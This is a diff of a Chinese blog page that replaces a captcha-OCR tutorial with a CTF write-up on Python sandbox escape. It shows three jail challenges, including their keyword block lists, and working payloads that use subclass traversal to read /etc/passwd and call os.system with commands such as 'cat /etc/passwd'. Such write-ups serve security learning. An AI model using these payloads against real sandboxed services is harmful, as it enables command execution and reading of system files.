@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Python," />
+  <meta name="keywords" content="python," />
 
 
 
@@ -81,18 +81,20 @@
 
 
 
-<meta name="description" content="0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei">
-<meta name="keywords" content="Python">
+<meta name="description" content="所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。  参考博客http://blog.51cto.com/13620939/2075204“PlaidCTF 2014 ‘nightmares‘ (Pwnables 375) writeup”从一个CTF题目学习Python">
+<meta name="keywords" content="python">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python识别验证码">
-<meta property="og:url" content="http://blog.Lhaihai.wang/2018/04/15/python识别验证码/index.html">
+<meta property="og:title" content="python沙箱逃逸">
+<meta property="og:url" content="http://blog.Lhaihai.wang/2018/09/01/python沙箱逃逸/index.html">
 <meta property="og:site_name" content="Lhaihai&#39;s Blog">
-<meta property="og:description" content="0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei">
+<meta property="og:description" content="所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。  参考博客http://blog.51cto.com/13620939/2075204“PlaidCTF 2014 ‘nightmares‘ (Pwnables 375) writeup”从一个CTF题目学习Python">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-15T06:41:49.153Z">
+<meta property="og:image" content="https://i.imgur.com/mFriZXt.png">
+<meta property="og:updated_time" content="2018-09-01T09:15:50.198Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python识别验证码">
-<meta name="twitter:description" content="0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei">
+<meta name="twitter:title" content="python沙箱逃逸">
+<meta name="twitter:description" content="所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。  参考博客http://blog.51cto.com/13620939/2075204“PlaidCTF 2014 ‘nightmares‘ (Pwnables 375) writeup”从一个CTF题目学习Python">
+<meta name="twitter:image" content="https://i.imgur.com/mFriZXt.png">
 
 
 
@@ -122,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/04/15/python识别验证码/"/>
+  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/09/01/python沙箱逃逸/"/>
 
 
 
 
 
-  <title>python识别验证码 | Lhaihai's Blog</title>
+  <title>python沙箱逃逸 | Lhaihai's Blog</title>
   
 
 
@@ -301,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/04/15/python识别验证码/">
+    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/09/01/python沙箱逃逸/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lhaihai">
@@ -318,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">python识别验证码</h1>
+          <h1 class="post-title" itemprop="name headline">python沙箱逃逸</h1>
         
 
         <div class="post-meta">
@@ -330,8 +332,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-15T13:36:09+08:00">
-                2018-04-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-01T17:12:33+08:00">
+                2018-09-01
               </time>
             
 
@@ -353,8 +355,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
                   </a>
                 </span>
 
@@ -395,32 +397,22 @@
       
 
       
-        <h4 id="0x00-安装环境"><a href="#0x00-安装环境" class="headerlink" title="0x00 安装环境"></a>0x00 安装环境</h4><p>OCR(Optical Character Recognition):</p>
-<p>光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。</p>
-<p>Tesseract：</p>
-<p>开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0</p>
-<p>(安装教程是从这复制来的：<a href="http://www.inimei.cn/archives/297.html" target="_blank" rel="noopener">http://www.inimei.cn/archives/297.html</a>)</p>
-<p>首先需要安装pytesseract库还有图像处理的PILLOW库了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pytesseract</span><br><span class="line">pip install PILLOW</span><br></pre></td></tr></table></figure>
-<p>然后要安装一个Tesseract-OCR软件。这个软件是由Google维护的开源的OCR软件。下载地址：<a href="https://pan.baidu.com/s/1slTsW2p" target="_blank" rel="noopener">百度网盘（密码：5m3d）</a>。再在Windows下配置一下环境变量。</p>
-<a id="more"></a>
-<h4 id="0x01报错：FileNotFoundError-WinError-2-系统找不到指定的文件。"><a href="#0x01报错：FileNotFoundError-WinError-2-系统找不到指定的文件。" class="headerlink" title="0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。"></a>0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。</h4><p><a href="https://blog.csdn.net/jacke121/article/details/75443785" target="_blank" rel="noopener">https://blog.csdn.net/jacke121/article/details/75443785</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pytesseract.pytesseract.tesseract_cmd = r&apos;C:\Program Files (x86)\Tesseract-OCR\tesseract.exe&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="0x02-报错：pytesseract-pytesseract-TesseractError-1-‘Error-opening-data-file-Program-Files-x86-Tesseract-OCR-eng-traineddata"><a href="#0x02-报错：pytesseract-pytesseract-TesseractError-1-‘Error-opening-data-file-Program-Files-x86-Tesseract-OCR-eng-traineddata" class="headerlink" title="0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata"></a>0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pytesseract.pytesseract.TesseractError: (1, &apos;Error opening data file \\Program Files (x86)\\Tesseract-OCR\\eng.traineddata Please make sure the TESSDATA_PREFIX environment variable is set to your &quot;tessdata&quot; directory. Failed loading language \&apos;eng\&apos; Tesseract couldn\&apos;t load any languages! Could not initialize tesseract.&apos;)</span><br></pre></td></tr></table></figure>
-<p>在.py 文件配置中指定 tessdata-dir</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tessdata_dir_config = <span class="string">'--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"'</span></span><br><span class="line">text = pytesseract.image_to_string(image,lang=<span class="string">'chi_sim'</span>,config=tessdata_dir_config)</span><br></pre></td></tr></table></figure>
-<h4 id="0x03-供上代码"><a href="#0x03-供上代码" class="headerlink" title="0x03 供上代码"></a>0x03 供上代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-15 13:18:36</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai ($&#123;email&#125;)</span></span><br><span class="line"><span class="comment"># @Link    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bin_table</span><span class="params">(threshold = <span class="number">230</span>)</span>:</span></span><br><span class="line">	<span class="comment"># 获取灰度转二值的映射table</span></span><br><span class="line">	table = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		<span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">			table.append(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			table.append(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	pytesseract.pytesseract.tesseract_cmd = <span class="string">r'D:\Program Files (x86)\Tesseract-OCR\tesseract.exe'</span></span><br><span class="line">	image = Image.open(<span class="string">'1.jpg'</span>)</span><br><span class="line">	<span class="comment"># image.show() #打开图片1.jpg</span></span><br><span class="line">	<span class="comment">#imgry = image.convert('L')  # 转化为灰度图，虽然说转为灰度图识别更好的一点，但随你喜欢用不用</span></span><br><span class="line">	<span class="comment">#table = get_bin_table()</span></span><br><span class="line">	<span class="comment">#out = imgry.point(table, '1')</span></span><br><span class="line">	tessdata_dir_config = <span class="string">'--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"'</span></span><br><span class="line">	text = pytesseract.image_to_string(image,lang=<span class="string">'eng'</span>,config=tessdata_dir_config)</span><br><span class="line">	<span class="comment"># fil = filter(str.isdigit, text)</span></span><br><span class="line">	<span class="comment"># new_text = ''</span></span><br><span class="line">	<span class="comment"># for i in fil:</span></span><br><span class="line">	<span class="comment"># 	new_text += i</span></span><br><span class="line">	print(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>有时候可以识别出来，有时候识别不了，时好时坏吧</p>
-<p>参考地址：</p>
-<p><a href="https://blog.csdn.net/Sioon_XUX/article/details/78617160" target="_blank" rel="noopener">https://blog.csdn.net/Sioon_XUX/article/details/78617160</a></p>
-<p><a href="http://www.cnblogs.com/zhongtang/tag/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/" target="_blank" rel="noopener">http://www.cnblogs.com/zhongtang/tag/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
-<p><a href="https://blog.csdn.net/kiramario/article/details/53781369" target="_blank" rel="noopener">https://blog.csdn.net/kiramario/article/details/53781369</a></p>
-<p><a href="https://github.com/tesseract-ocr/tesseract/wiki/4.0-with-LSTM#400-alpha-for-windows" target="_blank" rel="noopener">https://github.com/tesseract-ocr/tesseract/wiki/4.0-with-LSTM#400-alpha-for-windows</a></p>
-<p><a href="https://github.com/tesseract-ocr/tesseract/wiki/Data-Files" target="_blank" rel="noopener">https://github.com/tesseract-ocr/tesseract/wiki/Data-Files</a></p>
-<p><a href="https://github.com/madmaze/pytesseract" target="_blank" rel="noopener">https://github.com/madmaze/pytesseract</a></p>
-<p><a href="https://github.com/tesseract-ocr/tesseract" target="_blank" rel="noopener">https://github.com/tesseract-ocr/tesseract</a></p>
-<p><a href="https://github.com/tesseract-ocr/tesseract/wiki" target="_blank" rel="noopener">https://github.com/tesseract-ocr/tesseract/wiki</a></p>
-
+        <p>所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。<br>Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。</p>
+<blockquote>
+<p>参考博客<br><a href="http://blog.51cto.com/13620939/2075204" target="_blank" rel="noopener">http://blog.51cto.com/13620939/2075204</a><br><a href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/" target="_blank" rel="noopener">“PlaidCTF 2014 ‘<strong>nightmares</strong>‘ (Pwnables 375) writeup”</a><br><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">从一个CTF题目学习Python沙箱逃逸</a><br><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/sandbox/python-sandbox-escape.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/sandbox/python-sandbox-escape.md</a><br><a href="https://https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">python沙箱逃逸小结</a><br><a href="https://www.jianshu.com/p/30ece4087a8a" target="_blank" rel="noopener">Python 沙箱逃逸 Payload 收集</a><br><a href="https://xz.aliyun.com/t/52/" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a></p>
+</blockquote>
+<h2 id="hackuctf-2012的一道题"><a href="#hackuctf-2012的一道题" class="headerlink" title="hackuctf 2012的一道题"></a>hackuctf 2012的一道题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span> </span><br><span class="line"></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>, </span><br><span class="line">    <span class="string">'file'</span>, </span><br><span class="line">    <span class="string">'execfile'</span>, </span><br><span class="line">    <span class="string">'compile'</span>, </span><br><span class="line">    <span class="string">'reload'</span>, </span><br><span class="line">    <span class="string">'__import__'</span>, </span><br><span class="line">    <span class="string">'eval'</span>, </span><br><span class="line">    <span class="string">'input'</span>] </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE: </span><br><span class="line">      <span class="keyword">del</span> __builtins__.__dict__[func] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall   </span><br><span class="line"><span class="comment">#Remove dangerous builtins </span></span><br><span class="line">make_secure() </span><br><span class="line"><span class="keyword">print</span><span class="string">'Go Ahead, Expoit me &gt;;D'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>): </span><br><span class="line">     <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>, </span><br><span class="line">        <span class="comment"># Read user input until the firstwhitespace character </span></span><br><span class="line">        inp = findall(<span class="string">'\S+'</span>,raw_input())[<span class="number">0</span>] </span><br><span class="line">        a = <span class="keyword">None</span> </span><br><span class="line">         <span class="comment"># Set a to the result from executingthe user input </span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;'</span>, a </span><br><span class="line">     <span class="keyword">except</span> Exception, e: </span><br><span class="line">         <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
+<h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [ </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets= __builtins__.__dict__.keys() </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>) </span><br><span class="line">targets.remove(<span class="string">'print'</span>) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets: </span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x] </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure>
+<p>第二题没有直接回显<br>我们可以用catch_warnings类（索引在59），进行命令执行。</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'cat /etc/passwd'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/mFriZXt.png" alt=""></p>
+<h2 id="cuit2017的题目，python3环境"><a href="#cuit2017的题目，python3环境" class="headerlink" title="cuit2017的题目，python3环境"></a>cuit2017的题目，python3环境</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*- </span></span><br><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, cmd, os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>] </span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intro= <span class="string">"""</span></span><br><span class="line"><span class="string">pwnhubcuit</span></span><br><span class="line"><span class="string">pwneverything</span></span><br><span class="line"><span class="string">Rules:</span></span><br><span class="line"><span class="string">-No import</span></span><br><span class="line"><span class="string">-No ...</span></span><br><span class="line"><span class="string">-No flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(command)</span>:</span> </span><br><span class="line">	exec(command, globals()) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jail</span><span class="params">(cmd.Cmd)</span>:</span></span><br><span class="line">	prompt    = <span class="string">'&gt;&gt;&gt; '</span> </span><br><span class="line">	filtered   =<span class="string">'\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'</span>.split(<span class="string">'|'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">do_EOF</span><span class="params">(self, line)</span>:</span> </span><br><span class="line">		sys.exit() </span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">emptyline</span><span class="params">(self)</span>:</span> </span><br><span class="line">		<span class="keyword">return</span> cmd.Cmd.emptyline(self) </span><br><span class="line">		</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span> </span><br><span class="line">		sys.stdout.write(<span class="string">'\x00'</span>) </span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">postcmd</span><span class="params">(self, stop, line)</span>:</span> </span><br><span class="line">		<span class="keyword">if</span> any(f <span class="keyword">in</span> line <span class="keyword">for</span> f <span class="keyword">in</span> self.filtered): </span><br><span class="line">			print(<span class="string">"You are a big hacker!!!"</span>) </span><br><span class="line">			print(<span class="string">"Go away"</span>) 		</span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			<span class="keyword">try</span>: </span><br><span class="line">				execute(line) </span><br><span class="line">			<span class="keyword">except</span> NameError: </span><br><span class="line">				print(<span class="string">"NameError: name'%s' is not defined"</span> % line) </span><br><span class="line">			<span class="keyword">except</span> Exception: </span><br><span class="line">				print(<span class="string">"Error: %s"</span> %line) </span><br><span class="line">		<span class="keyword">return</span> cmd.Cmd.postcmd(self, stop,line) </span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </span><br><span class="line">	<span class="keyword">try</span>: </span><br><span class="line">		Jail().cmdloop(intro) </span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt: </span><br><span class="line">		print(<span class="string">"\rSee you next time!"</span>)</span><br></pre></td></tr></table></figure>
+<p>这里主要过滤了大量的字符，包括1，2题所用的点号<code>.</code><br>获取system函数地址，<br>执行system(“ls”)</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(getattr(os, <span class="string">"system"</span>)</span><br><span class="line">print(getattr(os, <span class="string">"system"</span>)(<span class="string">"ls"</span>))</span><br><span class="line">print(getattr(os, <span class="string">"system"</span>)(<span class="string">"cat flag"</span>))</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -437,7 +429,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Python/" rel="tag"># Python</a>
+            <a href="/tags/python/" rel="tag"># python</a>
           
         </div>
       
@@ -450,8 +442,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/14/python-twilio发送短信/" rel="next" title="python+twilio发送短信">
-                <i class="fa fa-chevron-left"></i> python+twilio发送短信
+              <a href="/2018/08/24/Format-String-Attack/" rel="next" title="Format_String_Attack">
+                <i class="fa fa-chevron-left"></i> Format_String_Attack
               </a>
             
           </div>
@@ -459,10 +451,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/16/小米路由器开机自动登录Dr-COM/" rel="prev" title="'小米路由器开机自动登录Dr.COM'">
-                '小米路由器开机自动登录Dr.COM' <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -615,7 +603,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-安装环境"><span class="nav-number">1.</span> <span class="nav-text">0x00 安装环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01报错：FileNotFoundError-WinError-2-系统找不到指定的文件。"><span class="nav-number">2.</span> <span class="nav-text">0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-报错：pytesseract-pytesseract-TesseractError-1-‘Error-opening-data-file-Program-Files-x86-Tesseract-OCR-eng-traineddata"><span class="nav-number">3.</span> <span class="nav-text">0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-供上代码"><span class="nav-number">4.</span> <span class="nav-text">0x03 供上代码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hackuctf-2012的一道题"><span class="nav-number">1.</span> <span class="nav-text">hackuctf 2012的一道题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo2"><span class="nav-number">2.</span> <span class="nav-text">demo2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cuit2017的题目，python3环境"><span class="nav-number">3.</span> <span class="nav-text">cuit2017的题目，python3环境</span></a></li></ol></div>
             
 
           </div>
